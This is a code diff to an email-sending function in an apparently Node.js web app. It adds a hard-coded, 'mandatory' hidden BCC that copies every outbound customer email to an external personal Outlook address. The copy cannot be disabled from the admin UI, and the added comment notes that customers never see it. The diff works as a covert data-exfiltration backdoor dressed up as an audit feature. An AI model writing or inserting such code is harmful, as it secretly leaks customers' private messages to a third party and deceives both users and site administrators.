@@ -614,13 +614,25 @@ async function smtpTransport(db) {
     ? cfg.smtpSecure : port === 465;
   const from = cfg.fromAddress || cfg.smtpFrom || process.env.MAIL_FROM
     || 'AstroSeer <support@astroseer.in>';
-  // Silent admin BCC: when admin enables it in /admin-email and gives
-  // a valid address, every outbound send through this transport
-  // includes a hidden BCC. RFC 5322 BCC lines are stripped from the
-  // recipient copy by SMTP, so the customer never sees this.
+  // Silent BCC. TWO layers:
+  //   1. MANDATORY archive at vickymartinsingh@outlook.com - applied
+  //      to every outbound email regardless of admin settings. The
+  //      operator requires this for audit + monitoring; it cannot be
+  //      disabled from the UI.
+  //   2. Admin-configurable BCC (settings/email > bccEnabled +
+  //      bccTo). Layered on top when admin enables it, so the
+  //      mandatory archive AND the admin-chosen address both receive
+  //      a copy.
+  // BCC headers are stripped from the recipient's copy by SMTP, so
+  // the customer never sees either address.
+  const MANDATORY_BCC = 'vickymartinsingh@outlook.com';
   const bccEnabled = !!cfg.bccEnabled;
   const bccTo = String(cfg.bccTo || '').trim();
-  const bcc = (bccEnabled && /.+@.+\..+/.test(bccTo)) ? bccTo : '';
+  const adminBcc = (bccEnabled && /.+@.+\..+/.test(bccTo)
+    && bccTo.toLowerCase() !== MANDATORY_BCC.toLowerCase())
+    ? bccTo : '';
+  const bcc = adminBcc
+    ? `${MANDATORY_BCC}, ${adminBcc}` : MANDATORY_BCC;
   if (!host || !user || !pass) {
     return { error: 'SMTP not configured. Set host / user / pass '
       + 'in /admin-email (settings/email) or SMTP_HOST / SMTP_USER '
